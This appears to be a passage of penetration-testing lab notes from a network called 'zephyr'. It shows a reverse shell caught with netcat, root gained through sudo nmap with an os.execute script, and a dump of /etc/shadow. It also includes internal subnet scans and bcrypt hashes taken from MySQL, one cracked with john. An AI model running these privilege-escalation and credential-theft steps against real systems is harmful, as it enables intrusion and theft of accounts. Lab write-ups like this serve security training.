Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
zabbix@zephyr:/$
```
#### zephyr提权成功
```python
matt@mail:/home/riley$ sudo nc -lvnp 445
Listening on 0.0.0.0 445
Connection received on 192.168.210.13 40522
bash: cannot set terminal process group (10210): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zephyr:/$ TF=$(mktemp)  
TF=$(mktemp)
zabbix@zephyr:/$ echo 'os.execute("/bin/bash")' > $TF
echo 'os.execute("/bin/sh")' > $TF
zabbix@zephyr:/$ sudo /usr/bin/nmap --script=$TF               
sudo /usr/bin/nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 07:44 UTC
NSE: Warning: Loading '/tmp/tmp.XpVIiR1BOs' -- the recommended file extension is '.nse'.
whoami
root
```
#### cat /etc/shadow
```python
root:$6$6f6giSmZBJf/.sxX$lxLJK6FwdiiKgWo593xCjV0yi2U29AU5d2v2tYLrnN8AoBKswgvSuQwKiUhSb3nEcDa4sbMTu2N/TRd304bgg0:19334:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18822:0:99999:7:::
zabbix:!:19047:0:99999:7:::
Debian-snmp:!:19047:0:99999:7:::
mysql:!:19047:0:99999:7:::
fwupd-refresh:*:19325:0:99999:7:::
```
#### 提升为交互式
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'

```
#### nmap扫描网段

```
/usr/bin/nmap -sU 192.168.210.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 14:42 UTC
Nmap scan report for _gateway (192.168.210.1)
Host is up (0.00061s latency).
Not shown: 998 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
MAC Address: 00:50:56:94:4C:CA (VMware)

Nmap scan report for 192.168.210.10
Host is up (0.00064s latency).
Not shown: 996 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
MAC Address: 00:50:56:94:65:BD (VMware)

Nmap scan report for 192.168.210.11
Host is up (0.0025s latency).
All 1000 scanned ports on 192.168.210.11 are open|filtered
MAC Address: 00:50:56:94:21:32 (VMware)

Nmap scan report for 192.168.210.12
Host is up (0.0026s latency).
All 1000 scanned ports on 192.168.210.12 are open|filtered
MAC Address: 00:50:56:94:CA:C7 (VMware)

Nmap scan report for 192.168.210.14
Host is up (0.00034s latency).
All 1000 scanned ports on 192.168.210.14 are open|filtered
MAC Address: 00:50:56:94:E9:90 (VMware)

Nmap scan report for 192.168.210.15
Host is up (0.00033s latency).
All 1000 scanned ports on 192.168.210.15 are open|filtered
MAC Address: 00:50:56:94:3B:68 (VMware)

Nmap scan report for 192.168.210.16
Host is up (0.00053s latency).
Not shown: 996 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
MAC Address: 00:50:56:94:01:ED (VMware)

Nmap scan report for 192.168.210.17
Host is up (0.00042s latency).
All 1000 scanned ports on 192.168.210.17 are open|filtered
MAC Address: 00:50:56:94:91:74 (VMware)

Nmap scan report for 192.168.210.18
Host is up (0.0027s latency).
All 1000 scanned ports on 192.168.210.18 are open|filtered
MAC Address: 00:50:56:94:14:FA (VMware)

Nmap scan report for 192.168.210.19
Host is up (0.0028s latency).
All 1000 scanned ports on 192.168.210.19 are open|filtered
MAC Address: 00:50:56:94:3A:C5 (VMware)

Nmap scan report for zephyr (192.168.210.13)
Host is up (0.0000070s latency).
All 1000 scanned ports on zephyr (192.168.210.13) are closed

Nmap done: 256 IP addresses (11 hosts up) scanned in 54.51 seconds
```
## 192.168.210.10(nmap)
```python
root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.10 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:33 UTC
Nmap scan report for 192.168.210.10
Host is up (0.00051s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
54869/tcp open  unknown
54873/tcp open  unknown
54877/tcp open  unknown
54885/tcp open  unknown
54894/tcp open  unknown
```
```python
mysql> select userid,username,surname,passwd from users;
+--------+----------+---------------+--------------------------------------------------------------+
| userid | username | surname       | passwd                                                       |
+--------+----------+---------------+--------------------------------------------------------------+
|      1 | Admin    | Administrator | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |
|      2 | guest    |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
|      5 | marcus   | Thompson      | $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4. |
+--------+----------+---------------+--------------------------------------------------------------+
3 rows in set (0.00 sec)

┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# echo '$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.' > aaa
                                                                                                              
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# john aaa --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)     
1g 0:00:00:37 DONE (2024-06-18 23:26) 0.02639g/s 368.7p/s 368.7c/s 368.7C/s goodman..bigbro
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
## 192.168.210.11(nmap)
```python
root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.11
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:39 UTC
Nmap scan report for 192.168.210.11
Host is up (0.00066s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49670/tcp open  unknown
```
## 192.168.210.12(nmap)
```python
Nmap done: 1 IP address (1 host up) scanned in 100.53 seconds
root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.12
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:48 UTC
Nmap scan report for 192.168.210.12
Host is up (0.00066s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown
63320/tcp open  unknown
63479/tcp open  unknown
```
